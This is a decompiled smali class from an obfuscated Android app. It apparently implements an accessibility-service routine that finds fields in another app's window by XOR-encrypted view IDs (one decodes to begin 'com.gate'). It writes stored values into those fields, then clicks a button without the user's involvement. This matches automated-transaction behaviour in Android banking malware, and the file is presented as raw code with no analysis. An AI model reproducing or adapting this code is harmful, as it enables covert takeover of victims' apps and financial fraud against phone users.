.class Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a$a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Lcom/vknnolqo/p9sv5zvf/TEh82iEU$c;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;->a()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;


# direct methods
.method constructor <init>(Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;)V
    .locals 0

    iput-object p1, p0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a$a;->a:Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a()V
    .locals 9

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT;->f:Landroid/widget/FrameLayout;

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT;->a:Landroid/widget/TextView;

    invoke-virtual {v0, v1}, Landroid/view/ViewGroup;->removeView(Landroid/view/View;)V

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a$a;->a:Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;

    iget-object v0, v0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;->a:Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;

    iget-object v0, v0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v1, 0x26

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    const/high16 v3, 0x200000

    const/16 v4, 0x25

    const/4 v5, 0x0

    const/4 v6, 0x1

    if-ne v1, v6, :cond_0

    invoke-interface {v0, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    new-instance v1, Landroid/os/Bundle;

    invoke-direct {v1}, Landroid/os/Bundle;-><init>()V

    new-array v7, v4, [B

    fill-array-data v7, :array_2

    new-array v8, v2, [B

    fill-array-data v8, :array_3

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT;->a()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v7, v8}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    invoke-virtual {v0, v3, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    :cond_0
    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a$a;->a:Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;

    iget-object v0, v0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;->a:Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;

    iget-object v0, v0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v1, 0x28

    new-array v1, v1, [B

    fill-array-data v1, :array_4

    new-array v7, v2, [B

    fill-array-data v7, :array_5

    invoke-static {v1, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    if-ne v1, v6, :cond_1

    invoke-interface {v0, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    new-instance v1, Landroid/os/Bundle;

    invoke-direct {v1}, Landroid/os/Bundle;-><init>()V

    new-array v7, v4, [B

    fill-array-data v7, :array_6

    new-array v8, v2, [B

    fill-array-data v8, :array_7

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT;->c()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v7, v8}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    invoke-virtual {v0, v3, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    :cond_1
    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a$a;->a:Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;

    iget-object v0, v0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;->a:Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;

    iget-object v0, v0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v1, 0x29

    new-array v1, v1, [B

    fill-array-data v1, :array_8

    new-array v7, v2, [B

    fill-array-data v7, :array_9

    invoke-static {v1, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    if-ne v1, v6, :cond_2

    invoke-interface {v0, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    new-instance v1, Landroid/os/Bundle;

    invoke-direct {v1}, Landroid/os/Bundle;-><init>()V

    new-array v7, v4, [B

    fill-array-data v7, :array_a

    new-array v8, v2, [B

    fill-array-data v8, :array_b

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT;->e()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v7, v8}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    invoke-virtual {v0, v3, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    :cond_2
    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a$a;->a:Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;

    iget-object v0, v0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;->a:Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;

    iget-object v0, v0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v1, 0x2b

    new-array v1, v1, [B

    fill-array-data v1, :array_c

    new-array v7, v2, [B

    fill-array-data v7, :array_d

    invoke-static {v1, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    if-ne v1, v6, :cond_3

    invoke-interface {v0, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    new-instance v1, Landroid/os/Bundle;

    invoke-direct {v1}, Landroid/os/Bundle;-><init>()V

    new-array v4, v4, [B

    fill-array-data v4, :array_e

    new-array v7, v2, [B

    fill-array-data v7, :array_f

    invoke-static {v4, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    sget-object v7, Lcom/vknnolqo/p9sv5zvf/F9v6QVyX;->j:Ljava/lang/String;

    invoke-virtual {v1, v4, v7}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    invoke-virtual {v0, v3, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    :cond_3
    const-wide/16 v0, 0x1f4

    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a$a;->a:Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;

    iget-object v0, v0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a$a;->a:Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;

    iget-object v0, v0, Lcom/vknnolqo/p9sv5zvf/O2DAZ4XT$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v1, 0x1f

    new-array v1, v1, [B

    fill-array-data v1, :array_10

    new-array v2, v2, [B

    fill-array-data v2, :array_11

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    if-ne v1, v6, :cond_4

    invoke-interface {v0, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    const/16 v1, 0x10

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_4
    const-wide/16 v0, 0x9c4

    :try_start_1
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_0

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->d(Ljava/lang/Boolean;)V

    const-string v0, ""

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/F9v6QVyX;->j:Ljava/lang/String;

    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1

    :catch_1
    move-exception v0

    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1

    :array_0
    .array-data 1
        -0x73t
        0x5et
        -0x55t
        -0x73t
        0x53t
        0x7et
        -0x6at
        -0x1at
        -0x79t
        0x1t
        -0x18t
        -0x40t
        0x5at
        0x31t
        -0x7bt
        -0x1et
        -0x66t
        0x54t
        -0x51t
        -0x6dt
        0xet
        0x76t
        -0x7at
        -0x54t
        -0x63t
        0x5ct
        -0x4bt
        -0x4t
        0x57t
        0x70t
        -0x7at
        -0x1at
        -0x4ft
        0x58t
        -0x58t
        -0x2dt
        0x41t
        0x6bt
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x12t
        0x31t
        -0x3at
        -0x5dt
        0x34t
        0x1ft
        -0x1et
        -0x7dt
    .end array-data

    :array_2
    .array-data 1
        -0x16t
        -0xdt
        -0x50t
        0x1dt
        0x14t
        0x16t
        -0x4bt
        0x3ft
        -0x7t
        -0x9t
        -0x4ft
        0x19t
        0x1et
        0x16t
        -0x42t
        0x21t
        -0x8t
        -0xbt
        -0x50t
        0xbt
        0xft
        0x1dt
        -0x4et
        0x2at
        -0xct
        -0xdt
        -0x54t
        0x15t
        0x9t
        0xbt
        -0x51t
        0x2ft
        -0x2t
        -0xbt
        -0x56t
        0x17t
        0x1et
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x55t
        -0x50t
        -0x1ct
        0x54t
        0x5bt
        0x58t
        -0x16t
        0x7et
    .end array-data

    :array_4
    .array-data 1
        -0x63t
        0x22t
        -0x35t
        0x54t
        -0x5at
        0x6t
        -0x70t
        -0x12t
        -0x69t
        0x7dt
        -0x78t
        0x19t
        -0x51t
        0x49t
        -0x7dt
        -0x16t
        -0x76t
        0x28t
        -0x31t
        0x4at
        -0x5t
        0xet
        -0x80t
        -0x5ct
        -0x65t
        0x20t
        -0x39t
        0x13t
        -0x53t
        0x38t
        -0x79t
        -0x1ct
        -0x66t
        0x28t
        -0x7t
        0x13t
        -0x51t
        0x17t
        -0x6ft
        -0x1t
    .end array-data

    :array_5
    .array-data 1
        -0x2t
        0x4dt
        -0x5at
        0x7at
        -0x3ft
        0x67t
        -0x1ct
        -0x75t
    .end array-data

    :array_6
    .array-data 1
        -0x7dt
        -0x2bt
        0x3at
        0x44t
        0x4ct
        0x40t
        0x2et
        -0x50t
        -0x70t
        -0x2ft
        0x3bt
        0x40t
        0x46t
        0x40t
        0x25t
        -0x52t
        -0x6ft
        -0x2dt
        0x3at
        0x52t
        0x57t
        0x4bt
        0x29t
        -0x5bt
        -0x63t
        -0x2bt
        0x26t
        0x4ct
        0x51t
        0x5dt
        0x34t
        -0x60t
        -0x69t
        -0x2dt
        0x20t
        0x4et
        0x46t
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x3et
        -0x6at
        0x6et
        0xdt
        0x3t
        0xet
        0x71t
        -0xft
    .end array-data

    :array_8
    .array-data 1
        0x25t
        0x54t
        0x70t
        -0x45t
        0x1ft
        0x65t
        -0x1dt
        -0x3dt
        0x2ft
        0xbt
        0x33t
        -0xat
        0x16t
        0x2at
        -0x10t
        -0x39t
        0x32t
        0x5et
        0x74t
        -0x5bt
        0x42t
        0x6dt
        -0xdt
        -0x77t
        0x21t
        0x54t
        0x72t
        -0xet
        0x14t
        0x61t
        -0x38t
        -0x3bt
        0x29t
        0x5ft
        0x78t
        -0x36t
        0x11t
        0x6at
        -0x19t
        -0x2dt
        0x32t
    .end array-data

    nop

    :array_9
    .array-data 1
        0x46t
        0x3bt
        0x1dt
        -0x6bt
        0x78t
        0x4t
        -0x69t
        -0x5at
    .end array-data

    :array_a
    .array-data 1
        -0x68t
        -0x1t
        0x45t
        0x9t
        0x26t
        -0x61t
        0x24t
        -0x59t
        -0x75t
        -0x5t
        0x44t
        0xdt
        0x2ct
        -0x61t
        0x2ft
        -0x47t
        -0x76t
        -0x7t
        0x45t
        0x1ft
        0x3dt
        -0x6ct
        0x23t
        -0x4et
        -0x7at
        -0x1t
        0x59t
        0x1t
        0x3bt
        -0x7et
        0x3et
        -0x49t
        -0x74t
        -0x7t
        0x5ft
        0x3t
        0x2ct
    .end array-data

    nop

    :array_b
    .array-data 1
        -0x27t
        -0x44t
        0x11t
        0x40t
        0x69t
        -0x2ft
        0x7bt
        -0x1at
    .end array-data

    :array_c
    .array-data 1
        0x1et
        -0x31t
        0x18t
        -0x1bt
        -0x60t
        -0xft
        0x1t
        -0x65t
        0x14t
        -0x70t
        0x5bt
        -0x58t
        -0x57t
        -0x42t
        0x12t
        -0x61t
        0x9t
        -0x3bt
        0x1ct
        -0x5t
        -0x3t
        -0x7t
        0x11t
        -0x2ft
        0x1bt
        -0x2bt
        0x1bt
        -0x51t
        -0x68t
        -0x20t
        0x14t
        -0x73t
        0xet
        -0x29t
        0x1at
        -0x47t
        -0x5dt
        -0x31t
        0x1ct
        -0x70t
        0xdt
        -0x2bt
        0x1t
    .end array-data

    :array_d
    .array-data 1
        0x7dt
        -0x60t
        0x75t
        -0x35t
        -0x39t
        -0x70t
        0x75t
        -0x2t
    .end array-data

    :array_e
    .array-data 1
        0x68t
        0x5at
        -0x2ct
        -0x5t
        0xdt
        0x6bt
        -0x4ft
        -0x65t
        0x7bt
        0x5et
        -0x2bt
        -0x1t
        0x7t
        0x6bt
        -0x46t
        -0x7bt
        0x7at
        0x5ct
        -0x2ct
        -0x13t
        0x16t
        0x60t
        -0x4at
        -0x72t
        0x76t
        0x5at
        -0x38t
        -0xdt
        0x10t
        0x76t
        -0x55t
        -0x75t
        0x7ct
        0x5ct
        -0x32t
        -0xft
        0x7t
    .end array-data

    nop

    :array_f
    .array-data 1
        0x29t
        0x19t
        -0x80t
        -0x4et
        0x42t
        0x25t
        -0x12t
        -0x26t
    .end array-data

    :array_10
    .array-data 1
        0x2t
        0x4dt
        0x30t
        0x61t
        -0x5t
        0x0t
        -0x23t
        -0x37t
        0x8t
        0x12t
        0x73t
        0x2ct
        -0xet
        0x4ft
        -0x32t
        -0x33t
        0x15t
        0x47t
        0x34t
        0x7ft
        -0x5at
        0x8t
        -0x33t
        -0x7dt
        0x2t
        0x4dt
        0x33t
        0x29t
        -0xbt
        0x13t
        -0x3ct
    .end array-data

    :array_11
    .array-data 1
        0x61t
        0x22t
        0x5dt
        0x4ft
        -0x64t
        0x61t
        -0x57t
        -0x54t
    .end array-data
.end method

.method public b()V
    .locals 0

    .line 1
    return-void
.end method
